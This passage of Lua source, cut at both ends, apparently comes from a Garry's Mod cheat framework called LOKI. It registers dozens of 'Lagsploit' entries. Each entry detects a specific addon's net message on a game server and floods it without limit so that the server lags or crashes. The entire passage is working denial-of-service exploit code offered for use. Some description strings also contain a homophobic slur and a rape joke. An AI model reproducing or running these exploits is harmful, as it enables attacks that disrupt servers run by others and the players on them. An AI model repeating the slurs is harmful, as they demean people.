    scan = function() return LOKI.ValidNetString( "TFA_Attachment_RequestAll" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "TFA_Attachment_RequestAll")
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool", },
    },
} ) 
LOKI.AddExploit( "Lagsploit", {
    desc = "Console: cries internally",
    severity = 90,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString( "NDES_SelectedEmblem" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "NDES_SelectedEmblem")
            net.WriteString("ODIUM.PRO")
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )     
LOKI.AddExploit( "Lagsploit", {
    desc = "ODIUM.PRO isn't a valid organisation",
    severity = 90,
    bools = {enabled = false},
    status = -1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString( "JoinOrg" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "JoinOrg")
            net.WriteEntity(LOKI.GetLP())
            net.WriteString("ODIUM.PRO")
            net.SendToServer()  
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )     
LOKI.AddExploit( "Lagsploit", {
    desc = "Something is creating very strong script errors",
    severity = 90,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString( "steamid50" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "steamid50")
            net.WriteString("Something is creating very strong script errors")
            net.SendToServer() 
        end,
    },
    functions = {
        { typ = "bool", },
    },
} ) 
LOKI.AddExploit( "Lagsploit", {
    desc = "This function is very inefficient for large tables and should probably not be called in things that run each frame",
    severity = 90,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString( "BM2.Command.SellBitcoins" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "BM2.Command.SellBitcoins")
            net.WriteEntity(LOKI.GetLP())
            net.SendToServer() 
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "Another of the same",
    severity = 95,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString( "metrostroi-specbutton-press" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "metrostroi-specbutton-press")
            net.SendToServer() 
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )
/*LOKI.AddExploit( "Lagsploit", {
    desc = "Causes decent lag but requires being near a wire keypad",
    severity = 95,
    bools = {enabled = false},
    status = 1,
    msgs_per_tick = function(sploit)
        local tbl = LOKI.RecursiveGetVar(sploit, {"vars", "Think", "ents"}, "table", true)
        LOKI.SetTableContents(tbl, LOKI.GetVarTable(ents.FindInSphere(LOKI.GetLP():GetShootPos(), 50), "GetClass", LOKI.TYPEVARS.EQUALTO, "gmod_wire_keypad"))
        return #tbl
    end,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString( "wire_keypad" ) end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs(LOKI.RecursiveGetVar(sploit, {"vars", "Think", "ents"}, "table", true)) do
                LOKI.NetStart( sploit, "wire_keypad")
                net.WriteEntity(v)
                net.WriteUInt(10, 4)
                net.SendToServer()
            end
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )*/ --Doesn't work but good example of function usage
LOKI.AddExploit( "Lagsploit", {
    desc = "Hack the mainframe",
    severity = 95,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString("friendlist") end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "friendlist" )
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "Yes, I am many people",
    severity = 90,
    bools = {enabled = false},
    status = 3,
    msgs_per_tick = function(sploit) return #LOKI.GetStored( "jdc_plyz", {} ) end,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString("join_disconnect") end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs(LOKI.GetStored( "jdc_plyz", {} )) do
                if IsValid(v) then
                    LOKI.NetStart( sploit, "join_disconnect" )
                    net.WriteEntity(v)
                    net.SendToServer()
                end
            end
        end,
    },
    functions = {
        { typ = "players", addr = "jdc_plyz" },
        { typ = "bool", },
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "Win every HvH",
    severity = 95,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString( "hvh_setloadout" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "hvh_setloadout")
            net.SendToServer() 
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "Slay the Titan",
    severity = 95,
    bools = {enabled = false},
    status = 2,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString( "Cl_PrometheusRequest" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "Cl_PrometheusRequest")
            net.SendToServer() 
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "This guy really needs to stop selling his scripts",
    severity = 95,
    bools = {enabled = true},
    status = 1,
    msgs_per_tick = LOKI.GetEnabledCount,
    times_per_tick = math.huge,
    scan = function() return LOKI.DynamicNetString( "CRAFTINGMOD" ) || LOKI.DynamicNetString( "FARMINGMOD" ) || LOKI.DynamicNetString( "FISHINGMOD" ) || LOKI.DynamicNetString( "bicyclemod" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.MultiSend(sploit, {
                ["bicyclemod_sell_bicycle"] = function()
                    net.WriteEntity(LOKI.GetLP())
                end,
                ["bicyclemod_store_bicycle"] = function()
                    net.WriteEntity(LOKI.GetLP())
                end,
                ["bicyclemod_create_bicycle"] = function()
                    net.WriteTable({})
                    net.WriteEntity(LOKI.GetLP())
                end,
            })
        end,
    },
    functions = {
        {
            typ = "bools", 
            tbl = {"CRAFTINGMOD_INVENTORY", "CRAFTINGMOD_SHOP", "CRAFTINGMOD_STORAGE", "CRAFTINGMOD_TRADING", "CRAFTINGMOD_MOVE", "CRAFTINGMOD_LEVELS", "CRAFTINGMOD_ADMIN", "CRAFTINGMOD_COMMANDS", "FARMINGMOD_ADMIN", "FARMINGMOD_HARVEST", "FARMINGMOD_ADDITEM", "FARMINGMOD_HARVEST", "FARMINGMOD_USE", "FARMINGMOD_DROPITEM", "FARMINGMOD_SELLITEM", "FARMINGMOD_PLANTOPTION", "FARMINGMOD_BUYITEM", "bicyclemod_create_bicycle", "bicyclemod_sell_bicycle", "bicyclemod_store_bicycle", "FISHINGMOD_ADMIN", "FISHINGMOD_BAIT", "FISHINGMOD_INVENTORY"}
        }
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "Looks like someone didn't attend their classes",
    severity = 95,
    bools = {enabled = false},
    status = 2,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString( "AdvDupe2_CanAutoSave" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "AdvDupe2_CanAutoSave")
            net.SendToServer() 
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "Dab on the server",
    severity = 95,
    bools = {enabled = false},
    status = 3,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString( "sphys_dupe" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "sphys_dupe")
            net.SendToServer() 
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "Another one bites the dust",
    severity = 95,
    bools = {enabled = true},
    status = 1,
    msgs_per_tick = LOKI.GetEnabledCount,
    times_per_tick = math.huge,
    scan = function() return WireLib != nil end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.MultiSend(sploit)
        end,
    },
    functions = {
        { typ = "bools", tbl = {"wire_expression2_request_file", "wire_adv_upload", "wire_expression2_request_list", "wire_adv_unwire", "wire_expression2_client_request_set_extension_status"}}
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "Remind the server to download more RAM",
    severity = 95,
    bools = {enabled = false},
    status = 2,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString( "pp_info_send" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "pp_info_send")
            net.SendToServer() 
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "My mom says I'm beautiful in my own way *sits on server*",
    severity = 95,
    bools = {enabled = true},
    status = 1,
    msgs_per_tick = LOKI.GetEnabledCount,
    times_per_tick = math.huge,
    scan = function() return LOKI.DynamicNetString("Prop2Mesh") end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.MultiSend(sploit)
        end,
    },
    functions = {
        { typ = "bools", tbl = {"Prop2MeshPostRemove", "Prop2MeshUpdateNWs"}}
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "*nuzzles server*",
    severity = 95,
    bools = {enabled = true},
    status = 1,
    msgs_per_tick = LOKI.GetEnabledCount,
    times_per_tick = math.huge,
    scan = function() return istable(TeamTable) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.MultiSend(sploit)
        end,
    },
    functions = {
        { typ = "bools", tbl = {"DemoteUser", "PromoteUser"}}
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "Incident ID: SERVER/1337 Reason: Cheating",
    severity = 95,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString("controlled_vars") || LOKI.DynamicNetString("diagnostics") || LOKI.DynamicNetString("luadev") end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.MultiSend(sploit)
        end,
    },
    functions = {
        { typ = "bools", tbl = {"diagnostics1", "diagnostics2", "diagnostics3", "controlled_vars", LOKI.DynamicNetString("luadev")}}
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "game.GetWorld():Remove()",
    severity = 95,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString("ContentRmvProps") end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart(sploit, "ContentRmvProps")
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool" }
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "LocalPlayer():SetClothing(nil)",
    severity = 95,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString("bodygroups_change") end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart(sploit, "bodygroups_change")
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool" }
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "Wash the server fans to keep them clean",
    severity = 95,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString("PS_ModifyItem") end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart(sploit, "PS_ModifyItem")
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool" }
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "System.AllocMem(System.GetMem());",
    severity = 95,
    bools = {enabled = true},
    status = 1,
    msgs_per_tick = LOKI.GetEnabledCount,
    times_per_tick = math.huge,
    scan = function() return VJBASE_VERSION != nil end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.MultiSend(sploit)
        end,
    },
    functions = {
        { typ = "bools", tbl = {"vj_npcmover_removeall", "vj_npcmover_sv_startmove"}}
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "Use the servers GPU as a miner",
    severity = 95,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString("aom_set_bool") end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart(sploit, "aom_set_bool")
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool" }
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "Place a hit on the server",
    severity = 95,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString("hhh_request") end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart(sploit, "hhh_request")
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool" }
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "Force the server to listen to Gucci Gang",
    severity = 95,
    bools = {enabled = true},
    status = 1,
    msgs_per_tick = LOKI.GetEnabledCount,
    times_per_tick = math.huge,
    scan = function() return MGangs != nil || isfunction(MG_AdminMenu) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.MultiSend(sploit)
        end,
    },
    functions = {
        { typ = "bools", tbl = {"MG2.Gang.Create", "MG2.Gang.UpdateGroups", "mg_creategang", "mg_plyupdateganggroups"}}
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "It's flu season and the server forgot to get vaccinated",
    severity = 95,
    bools = {enabled = true},
    status = 1,
    msgs_per_tick = LOKI.GetEnabledCount,
    times_per_tick = math.huge,
    scan = function() return LOKI.DynamicNetString("smartdisease") end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.MultiSend(sploit)
        end,
    },
    functions = {
        { typ = "bools", tbl = {"smartdisease_buy", "smartdisease_buy_vaccine"}}
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "cl_ping_delay 0",
    severity = 95,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString("StatusScreen_Ping") end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart(sploit, "StatusScreen_Ping")
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool" }
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "Preparing to send data [inf parts]",
    severity = 95,
    bools = {enabled = true},
    status = 1,
    msgs_per_tick = LOKI.GetEnabledCount,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString("ScreengrabInitCallback") || LOKI.ValidNetString("grab_ScreenshotToServer") end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.MultiSend(sploit)
        end,
    },
    functions = {
        { typ = "bools", tbl = {"ScreengrabInitCallback", "grab_ScreenshotToServer"}}
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "SERVER: *crashes internally*",
    severity = 95,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString("sgGiveFriendStatusAll") end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart(sploit, "sgGiveFriendStatusAll")
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool" }
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "Be the giant flamboyant faggot kid",
    severity = 95,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString("NStatistics_SendPlayerStatistic") end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart(sploit, "NStatistics_SendPlayerStatistic")
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool" }
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "The load limit is 40 tonnes but you're hauling 110",
    severity = 95,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString("SCarSpawnSendFile") end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart(sploit, "SCarSpawnSendFile")
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool" }
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "Man, this server sure is laggy today",
    severity = 95,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString("ts_buytitle") end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart(sploit, "ts_buytitle")
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool" }
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "Pull the power plug on the server",
    severity = 95,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString("UpdateNameColor") end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart(sploit, "UpdateNameColor")
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool" }
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "I'll take one serving of poorly optimized code, please",
    severity = 95,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString("noob_playerperks") end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart(sploit, "noob_playerperks")
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool" }
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "Who needs doors when you can just smash through a wall?",
    severity = 95,
    bools = {enabled = true},
    status = 1,
    msgs_per_tick = LOKI.GetEnabledCount,
    times_per_tick = math.huge,
    scan = function() return LOKI.DynamicNetString("advdoors") end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.MultiSend(sploit)
        end,
    },
    functions = {
        { typ = "bools", tbl = {"advdoors_purchasemod", "advdoors_updaterent", "advdoors_rent", "advdoors_settitle", "advdoors_coowneradd", "advdoors_coownerallowedremove", "advdoors_coownerremove", "advdoors_transferownership", "advdoors_toggleownership", "advdoors_addblacklist", "advdoors_removeblacklist", "advdoors_addjob", "advdoors_setgroup", "advdoors_jobremove", "advdoors_anyplayer", "advdoors_addjobplayer", "advdoors_jobremoveplayer", "advdoors_changeprice", "advdoors_otheractions"}}
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "Fill the server full of lead",
    severity = 95,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString("perm_buyweapon") end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart(sploit, "perm_buyweapon")
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool" }
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "Pour some gas in the server room and light it up",
    severity = 95,
    bools = {enabled = true},
    status = 1,
    msgs_per_tick = LOKI.GetEnabledCount,
    times_per_tick = math.huge,
    scan = function() return LOKI.DynamicNetString("zrush") end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.MultiSend(sploit, function()
                net.WriteFloat(LOKI.GetLP():EntIndex())
            end)
        end,
    },
    functions = {
        { typ = "bools", tbl = {"zrush_BarrelCollectFuel_net", "zrush_BarrelSplitFuel_net", "zrush_MachineCrateOB_Place_net", "zrush_MachineCrateBuilder_DeselectEntity_net"}}
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "Drunk drive through the server farm",
    severity = 95,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString("CarDisplayPurchaseCar") end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart(sploit, "CarDisplayPurchaseCar")
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool" }
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "Beat the server to death with a cash register",
    severity = 95,
    bools = {enabled = true},
    status = 1,
    msgs_per_tick = LOKI.GetEnabledCount,
    times_per_tick = math.huge,
    scan = function() return LOKI.DynamicNetString("cashregister") end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.MultiSend(sploit, function()
                net.WriteEntity(LOKI.GetLP())
            end)
        end,
    },
    functions = {
        { typ = "bools", tbl = {"cashregister_settings_color", "cashregister_settings_remowner", "cashregister_settings_addowner", "cashregister_settings_setpayrece", "cashregister_do_reset", "cashregister_do_refound"}}
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "Order a DDoS on the Black Market",
    severity = 95,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString("bm_DoAddMarket") end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart(sploit, "bm_DoAddMarket")
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool" }
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "There's no brakes on the rape mobile",
    severity = 95,
    bools = {enabled = true},
    status = 1,
    msgs_per_tick = LOKI.GetEnabledCount,
    times_per_tick = math.huge,
    scan = function() return LOKI.DynamicNetString("fcd.") end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.MultiSend(sploit, {["fcd_chopshopyes"] = function() net.WriteEntity(LOKI.GetLP()) end})
        end,
    },
    functions = {
        { typ = "bools", tbl = {"fcd.addVehicle", "fcd.spawnVehicle", "fcd_chopshopyes"} }
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "Order an Industrial Grade Lag Bomb",
    severity = 95,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString("gindustrial_item_sources") end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart(sploit, "gindustrial_item_sources")
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool" }
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "Start Hacking Mission",
    severity = 95,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString("StartHackingMission") end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart(sploit, "StartHackingMission")
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool" }
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "Damn printers always getting jammed",
    severity = 95,
    bools = {enabled = true},
    status = 1,
    msgs_per_tick = LOKI.GetEnabledCount,
    times_per_tick = math.huge,
    scan = function() return LOKI.DynamicNetString("NGII_") end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.MultiSend(sploit)
        end,
    },
    functions = {
        { typ = "bools", tbl = {"NGII_TakeMoney", "NGII_UninstallMod"} }
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "Only the finest grade lag",
    severity = 95,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString("ncpstoredoact") end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart(sploit, "ncpstoredoact")
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool" }
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "Purchase a DDoS attack with your spare credits",
    severity = 95,
    bools = {enabled = true},
    status = 1,
    msgs_per_tick = LOKI.GetEnabledCount,
    times_per_tick = math.huge,
    scan = function() return LOKI.DynamicNetString("credit_") end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.MultiSend(sploit)
        end,
    },
    functions = {
        { typ = "bools", tbl = {"credit_pay", "credit_loan", "credit_loan_deny"} }
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "Load up LOIC like a big boy hacker",
    severity = 95,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString("usec_keypad") end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart(sploit, "usec_keypad")
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool" }
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "Show the world how much of a sore loser you are",
    severity = 95,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString("movePiece") end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart(sploit, "movePiece")
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool" }
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "Man, this lag sure does make driving difficult",
    severity = 95,
    bools = {enabled = true},
    status = 1,
    msgs_per_tick = LOKI.GetEnabledCount,
    times_per_tick = math.huge,
    scan = function() return nucardealer != nil end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.MultiSend(sploit)
        end,
    },
    functions = {
        { typ = "bools", tbl = {"nucauction_post", "nucardealer_spawn"} }
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "Looks like the server printer ran out of ink",
    severity = 95,
    bools = {enabled = true},
    status = 1,
    msgs_per_tick = LOKI.GetEnabledCount,
    times_per_tick = math.huge,
    prevalidated = true,
    scan = function() return LOKI.ValidNetString("gPrinters.addUpgrade", "gPrinters.sendID") end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.MultiSend(sploit)
        end,
    },
    functions = {
        { typ = "bools", tbl = {"gPrinters.addUpgrade", "gPrinters.sendID"} }
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "Faulty printers causing the servers ink to bleed",
    severity = 95,
    bools = {enabled = true},
    status = 1,
    msgs_per_tick = LOKI.GetEnabledCount,
    times_per_tick = math.huge,
    scan = function() return LOKI.DynamicNetString("lithium") end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.MultiSend(sploit)
        end,
    },
    functions = {
        { typ = "bools", tbl = {"buyLp2Item", "lithium_printers_2_small_rack_screen", "lithiumPrinter2Donator", "lithiumPrinter2Obsidian", "lithiumPrinter2Silver", "lithiumPrinter2Iron", "lithiumPrinter2Economic", "lithiumPrinter2Bronze"} }
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "Suggest the server gets better security",
    severity = 95,
    bools = {enabled = true},
    status = 1,
    msgs_per_tick = LOKI.GetEnabledCount,
    times_per_tick = math.huge,
    scan = function() return LOKI.DynamicNetString("Suggestions") end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.MultiSend(sploit)
        end,
    },
    functions = {
        { typ = "bools", tbl = {"SuggestionsClientEdits", "SuggestionsGetInfo"}}
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "'net library optimizations'",
    severity = 95,
    bools = {enabled = true},
    status = 1,
    msgs_per_tick = LOKI.GetEnabledCount,
    times_per_tick = math.huge,
    scan = function() return LOKI.DynamicNetString("LibK") end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.MultiSend(sploit)
        end,
    },
    functions = {
        { typ = "bools", tbl = {"LibK_Transaction", "ControllerAction"}}
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "Short Circuit the server",
    severity = 95,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString("PS2_ItemServerRPC") end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart(sploit, "PS2_ItemServerRPC")
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool" }
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "Who thought it was a good idea to run printers on battery?",
    severity = 95,
    bools = {enabled = true},
    status = 1,
    msgs_per_tick = LOKI.GetEnabledCount,
    times_per_tick = math.huge,
    scan = function() return LOKI.DynamicNetString("fg_printer") end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.MultiSend(sploit)
        end,
    },
    functions = {
        { typ = "bools", tbl = {"fg_printer_upgrade_speed", "fg_printer_upgrade_quality", "fg_printer_upgrade_cooler", "fg_printer_power", "fg_printer_money"} }
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "Start a food fight in the server room",
    severity = 95,
    bools = {enabled = true},
    status = 1,
    msgs_per_tick = LOKI.GetEnabledCount,
    times_per_tick = math.huge,
    scan = function() return LOKI.DynamicNetString("zfs_") end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.MultiSend(sploit)
        end,
    },
    functions = {
        { typ = "bools", tbl = {"zfs_ItemPriceChange_sv", "zfs_ItemBuyUpdate_cl"} }
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "Add a special server lag effect to your hat",
    severity = 95,
    bools = {enabled = true},
    status = 1,
    msgs_per_tick = LOKI.GetEnabledCount,
    times_per_tick = math.huge,
    scan = function() return istable(HAT) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.MultiSend(sploit)
        end,
    },
    functions = {
        { typ = "bools", tbl = {"BuyHats", "SendCustomHatData"} }
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "Add a special server lag effect to your hat",
    severity = 95,
    bools = {enabled = true},
    status = 1,
    msgs_per_tick = LOKI.GetEnabledCount,
    times_per_tick = math.huge,
    scan = function() return LOKI.DynamicNetString("VChars::") end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.MultiSend(sploit)
        end,
    },
    functions = {
        { typ = "bools", tbl = {"VChars::SelectCharacter", "VChars::CreateCharacter"} }
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "Modern hardware isn't designed for AI yet",
    severity = 95,
    bools = {enabled = true},
    status = 1,
    msgs_per_tick = LOKI.GetEnabledCount,
    times_per_tick = math.huge,
    scan = function() return LOKI.DynamicNetString("npctool") end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.MultiSend(sploit)
        end,
    },
    functions = {
        { typ = "bools", tbl = {"npctool_spawner_clearundo", "sv_npctool_spawner_ppoint"} }
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "game.GetWorld():Fire('Kill')",
    severity = 95,
    bools = {enabled = false},
    status = 1,
    msgs_per_tick = LOKI.GetEnabledCount,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString("npcData") end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart(sploit, "npcData")
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool" }
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "Flood the server lua stealer",
    severity = 95,
